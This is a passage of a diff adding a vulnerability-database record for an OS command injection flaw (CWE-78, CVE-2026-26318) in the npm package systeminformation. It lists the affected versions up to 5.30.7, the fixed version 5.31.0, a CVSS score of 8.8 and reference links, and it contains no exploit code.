+      - pkg:npm/systeminformation@5.8.5
+      - pkg:npm/systeminformation@5.8.6
+      - pkg:npm/systeminformation@5.8.7
+      - pkg:npm/systeminformation@5.8.8
+      - pkg:npm/systeminformation@5.8.9
+      - pkg:npm/systeminformation@5.9.0
+      - pkg:npm/systeminformation@5.9.1
+      - pkg:npm/systeminformation@5.9.2
+      - pkg:npm/systeminformation@5.9.3
+      - pkg:npm/systeminformation@5.9.4
+      - pkg:npm/systeminformation@5.9.5
+      - pkg:npm/systeminformation@5.9.6
+      - pkg:npm/systeminformation@5.9.7
+      - pkg:npm/systeminformation@5.9.8
+      - pkg:npm/systeminformation@5.9.9
+      - pkg:npm/systeminformation@5.9.10
+      - pkg:npm/systeminformation@5.9.11
+      - pkg:npm/systeminformation@5.9.12
+      - pkg:npm/systeminformation@5.9.13
+      - pkg:npm/systeminformation@5.9.14
+      - pkg:npm/systeminformation@5.9.15
+      - pkg:npm/systeminformation@5.9.16
+      - pkg:npm/systeminformation@5.9.17
+      - pkg:npm/systeminformation@5.9.18
+      - pkg:npm/systeminformation@5.10.0
+      - pkg:npm/systeminformation@5.10.1
+      - pkg:npm/systeminformation@5.10.2
+      - pkg:npm/systeminformation@5.10.3
+      - pkg:npm/systeminformation@5.10.4
+      - pkg:npm/systeminformation@5.10.5
+      - pkg:npm/systeminformation@5.10.6
+      - pkg:npm/systeminformation@5.10.7
+      - pkg:npm/systeminformation@5.11.0
+      - pkg:npm/systeminformation@5.11.1
+      - pkg:npm/systeminformation@5.11.2
+      - pkg:npm/systeminformation@5.11.3
+      - pkg:npm/systeminformation@5.11.4
+      - pkg:npm/systeminformation@5.11.5
+      - pkg:npm/systeminformation@5.11.6
+      - pkg:npm/systeminformation@5.11.7
+      - pkg:npm/systeminformation@5.11.8
+      - pkg:npm/systeminformation@5.11.9
+      - pkg:npm/systeminformation@5.11.10
+      - pkg:npm/systeminformation@5.11.11
+      - pkg:npm/systeminformation@5.11.12
+      - pkg:npm/systeminformation@5.11.13
+      - pkg:npm/systeminformation@5.11.14
+      - pkg:npm/systeminformation@5.11.15
+      - pkg:npm/systeminformation@5.11.16
+      - pkg:npm/systeminformation@5.11.17
+      - pkg:npm/systeminformation@5.11.18
+      - pkg:npm/systeminformation@5.11.19
+      - pkg:npm/systeminformation@5.11.20
+      - pkg:npm/systeminformation@5.11.21
+      - pkg:npm/systeminformation@5.11.22
+      - pkg:npm/systeminformation@5.11.23
+      - pkg:npm/systeminformation@5.11.24
+      - pkg:npm/systeminformation@5.11.25
+      - pkg:npm/systeminformation@5.11.26
+      - pkg:npm/systeminformation@5.12.0
+      - pkg:npm/systeminformation@5.12.1
+      - pkg:npm/systeminformation@5.12.2
+      - pkg:npm/systeminformation@5.12.3
+      - pkg:npm/systeminformation@5.12.4
+      - pkg:npm/systeminformation@5.12.5
+      - pkg:npm/systeminformation@5.12.6
+      - pkg:npm/systeminformation@5.12.7
+      - pkg:npm/systeminformation@5.12.8
+      - pkg:npm/systeminformation@5.12.9
+      - pkg:npm/systeminformation@5.12.10
+      - pkg:npm/systeminformation@5.12.11
+      - pkg:npm/systeminformation@5.12.12
+      - pkg:npm/systeminformation@5.12.13
+      - pkg:npm/systeminformation@5.12.14
+      - pkg:npm/systeminformation@5.12.15
+      - pkg:npm/systeminformation@5.13.0
+      - pkg:npm/systeminformation@5.13.1
+      - pkg:npm/systeminformation@5.13.2
+      - pkg:npm/systeminformation@5.13.3
+      - pkg:npm/systeminformation@5.13.4
+      - pkg:npm/systeminformation@5.13.5
+      - pkg:npm/systeminformation@5.14.0
+      - pkg:npm/systeminformation@5.14.1
+      - pkg:npm/systeminformation@5.14.2
+      - pkg:npm/systeminformation@5.14.3
+      - pkg:npm/systeminformation@5.14.4
+      - pkg:npm/systeminformation@5.15.0
+      - pkg:npm/systeminformation@5.15.1
+      - pkg:npm/systeminformation@5.16.0
+      - pkg:npm/systeminformation@5.16.1
+      - pkg:npm/systeminformation@5.16.2
+      - pkg:npm/systeminformation@5.16.3
+      - pkg:npm/systeminformation@5.16.4
+      - pkg:npm/systeminformation@5.16.5
+      - pkg:npm/systeminformation@5.16.6
+      - pkg:npm/systeminformation@5.16.7
+      - pkg:npm/systeminformation@5.16.8
+      - pkg:npm/systeminformation@5.16.9
+      - pkg:npm/systeminformation@5.17.0
+      - pkg:npm/systeminformation@5.17.1
+      - pkg:npm/systeminformation@5.17.2
+      - pkg:npm/systeminformation@5.17.3
+      - pkg:npm/systeminformation@5.17.4
+      - pkg:npm/systeminformation@5.17.5
+      - pkg:npm/systeminformation@5.17.6
+      - pkg:npm/systeminformation@5.17.7
+      - pkg:npm/systeminformation@5.17.8
+      - pkg:npm/systeminformation@5.17.9
+      - pkg:npm/systeminformation@5.17.10
+      - pkg:npm/systeminformation@5.17.11
+      - pkg:npm/systeminformation@5.17.12
+      - pkg:npm/systeminformation@5.17.13
+      - pkg:npm/systeminformation@5.17.14
+      - pkg:npm/systeminformation@5.17.15
+      - pkg:npm/systeminformation@5.17.16
+      - pkg:npm/systeminformation@5.17.17
+      - pkg:npm/systeminformation@5.18.0
+      - pkg:npm/systeminformation@5.18.1
+      - pkg:npm/systeminformation@5.18.2
+      - pkg:npm/systeminformation@5.18.3
+      - pkg:npm/systeminformation@5.18.4
+      - pkg:npm/systeminformation@5.18.5
+      - pkg:npm/systeminformation@5.18.6
+      - pkg:npm/systeminformation@5.18.7
+      - pkg:npm/systeminformation@5.18.8
+      - pkg:npm/systeminformation@5.18.9
+      - pkg:npm/systeminformation@5.18.10
+      - pkg:npm/systeminformation@5.18.11
+      - pkg:npm/systeminformation@5.18.12
+      - pkg:npm/systeminformation@5.18.13
+      - pkg:npm/systeminformation@5.18.14
+      - pkg:npm/systeminformation@5.18.15
+      - pkg:npm/systeminformation@5.19.0
+      - pkg:npm/systeminformation@5.19.1
+      - pkg:npm/systeminformation@5.20.0
+      - pkg:npm/systeminformation@5.21.0
+      - pkg:npm/systeminformation@5.21.1
+      - pkg:npm/systeminformation@5.21.2
+      - pkg:npm/systeminformation@5.21.3
+      - pkg:npm/systeminformation@5.21.4
+      - pkg:npm/systeminformation@5.21.5
+      - pkg:npm/systeminformation@5.21.6
+      - pkg:npm/systeminformation@5.21.7
+      - pkg:npm/systeminformation@5.21.8
+      - pkg:npm/systeminformation@5.21.9
+      - pkg:npm/systeminformation@5.21.10
+      - pkg:npm/systeminformation@5.21.11
+      - pkg:npm/systeminformation@5.21.12
+      - pkg:npm/systeminformation@5.21.13
+      - pkg:npm/systeminformation@5.21.14
+      - pkg:npm/systeminformation@5.21.15
+      - pkg:npm/systeminformation@5.21.16
+      - pkg:npm/systeminformation@5.21.17
+      - pkg:npm/systeminformation@5.21.18
+      - pkg:npm/systeminformation@5.21.19
+      - pkg:npm/systeminformation@5.21.20
+      - pkg:npm/systeminformation@5.21.21
+      - pkg:npm/systeminformation@5.21.22
+      - pkg:npm/systeminformation@5.21.23
+      - pkg:npm/systeminformation@5.21.24
+      - pkg:npm/systeminformation@5.21.25
+      - pkg:npm/systeminformation@5.22.0
+      - pkg:npm/systeminformation@5.22.1
+      - pkg:npm/systeminformation@5.22.2
+      - pkg:npm/systeminformation@5.22.3
+      - pkg:npm/systeminformation@5.22.4
+      - pkg:npm/systeminformation@5.22.5
+      - pkg:npm/systeminformation@5.22.6
+      - pkg:npm/systeminformation@5.22.7
+      - pkg:npm/systeminformation@5.22.8
+      - pkg:npm/systeminformation@5.22.9
+      - pkg:npm/systeminformation@5.22.10
+      - pkg:npm/systeminformation@5.22.11
+      - pkg:npm/systeminformation@5.23.0
+      - pkg:npm/systeminformation@5.23.1
+      - pkg:npm/systeminformation@5.23.2
+      - pkg:npm/systeminformation@5.23.3
+      - pkg:npm/systeminformation@5.23.4
+      - pkg:npm/systeminformation@5.23.5
+      - pkg:npm/systeminformation@5.23.6
+      - pkg:npm/systeminformation@5.23.8
+      - pkg:npm/systeminformation@5.23.9
+      - pkg:npm/systeminformation@5.23.10
+      - pkg:npm/systeminformation@5.23.11
+      - pkg:npm/systeminformation@5.23.12
+      - pkg:npm/systeminformation@5.23.13
+      - pkg:npm/systeminformation@5.23.14
+      - pkg:npm/systeminformation@5.23.15
+      - pkg:npm/systeminformation@5.23.16
+      - pkg:npm/systeminformation@5.23.17
+      - pkg:npm/systeminformation@5.23.18
+      - pkg:npm/systeminformation@5.23.19
+      - pkg:npm/systeminformation@5.23.20
+      - pkg:npm/systeminformation@5.23.21
+      - pkg:npm/systeminformation@5.23.22
+      - pkg:npm/systeminformation@5.23.23
+      - pkg:npm/systeminformation@5.23.24
+      - pkg:npm/systeminformation@5.23.25
+      - pkg:npm/systeminformation@5.24.0
+      - pkg:npm/systeminformation@5.24.1
+      - pkg:npm/systeminformation@5.24.2
+      - pkg:npm/systeminformation@5.24.3
+      - pkg:npm/systeminformation@5.24.4
+      - pkg:npm/systeminformation@5.24.5
+      - pkg:npm/systeminformation@5.24.6
+      - pkg:npm/systeminformation@5.24.7
+      - pkg:npm/systeminformation@5.24.8
+      - pkg:npm/systeminformation@5.24.9
+      - pkg:npm/systeminformation@5.25.0
+      - pkg:npm/systeminformation@5.25.1
+      - pkg:npm/systeminformation@5.25.2
+      - pkg:npm/systeminformation@5.25.3
+      - pkg:npm/systeminformation@5.25.4
+      - pkg:npm/systeminformation@5.25.5
+      - pkg:npm/systeminformation@5.25.6
+      - pkg:npm/systeminformation@5.25.7
+      - pkg:npm/systeminformation@5.25.8
+      - pkg:npm/systeminformation@5.25.9
+      - pkg:npm/systeminformation@5.25.10
+      - pkg:npm/systeminformation@5.25.11
+      - pkg:npm/systeminformation@5.26.0
+      - pkg:npm/systeminformation@5.26.1
+      - pkg:npm/systeminformation@5.26.2
+      - pkg:npm/systeminformation@5.27.0
+      - pkg:npm/systeminformation@5.27.1
+      - pkg:npm/systeminformation@5.27.2
+      - pkg:npm/systeminformation@5.27.3
+      - pkg:npm/systeminformation@5.27.4
+      - pkg:npm/systeminformation@5.27.5
+      - pkg:npm/systeminformation@5.27.6
+      - pkg:npm/systeminformation@5.27.7
+      - pkg:npm/systeminformation@5.27.8
+      - pkg:npm/systeminformation@5.27.9
+      - pkg:npm/systeminformation@5.27.10
+      - pkg:npm/systeminformation@5.27.11
+      - pkg:npm/systeminformation@5.27.12
+      - pkg:npm/systeminformation@5.27.13
+      - pkg:npm/systeminformation@5.27.14
+      - pkg:npm/systeminformation@5.27.15
+      - pkg:npm/systeminformation@5.27.16
+      - pkg:npm/systeminformation@5.27.17
+      - pkg:npm/systeminformation@5.28.0
+      - pkg:npm/systeminformation@5.28.1
+      - pkg:npm/systeminformation@5.28.2
+      - pkg:npm/systeminformation@5.28.3
+      - pkg:npm/systeminformation@5.28.4
+      - pkg:npm/systeminformation@5.28.5
+      - pkg:npm/systeminformation@5.28.6
+      - pkg:npm/systeminformation@5.28.7
+      - pkg:npm/systeminformation@5.28.8
+      - pkg:npm/systeminformation@5.28.9
+      - pkg:npm/systeminformation@5.28.10
+      - pkg:npm/systeminformation@5.29.0
+      - pkg:npm/systeminformation@5.29.1
+      - pkg:npm/systeminformation@5.30.0
+      - pkg:npm/systeminformation@5.30.1
+      - pkg:npm/systeminformation@5.30.2
+      - pkg:npm/systeminformation@5.30.3
+      - pkg:npm/systeminformation@5.30.4
+      - pkg:npm/systeminformation@5.30.5
+      - pkg:npm/systeminformation@5.30.6
+      - pkg:npm/systeminformation@5.30.7
+    fixed_packages:
+      - pkg:npm/systeminformation@5.31.0
+    fixed_in_commits: []
+    introduced_in_commits: []
+severities:
+  - score: '8.8'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H
+    published_at:
+    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/02/GHSA-5vv4-hvf7-2h46/GHSA-5vv4-hvf7-2h46.json
+  - score: HIGH
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at:
+    url:
+weaknesses:
+  - CWE-78
+references:
+  - url: https://github.com/sebhildebrandt/systeminformation
+    reference_type:
+    reference_id:
+  - url: https://github.com/sebhildebrandt/systeminformation/commit/b67d3715eec881038ccbaace2f2711419ac3e107
+    reference_type:
+    reference_id:
+  - url: https://nvd.nist.gov/vuln/detail/CVE-2026-26318
+    reference_type:
+    reference_id: CVE-2026-26318
+  - url: https://github.com/sebhildebrandt/systeminformation/security/advisories/GHSA-5vv4-hvf7-2h46
+    reference_type:
+    reference_id: GHSA-5vv4-hvf7-2h46
+exploits: []
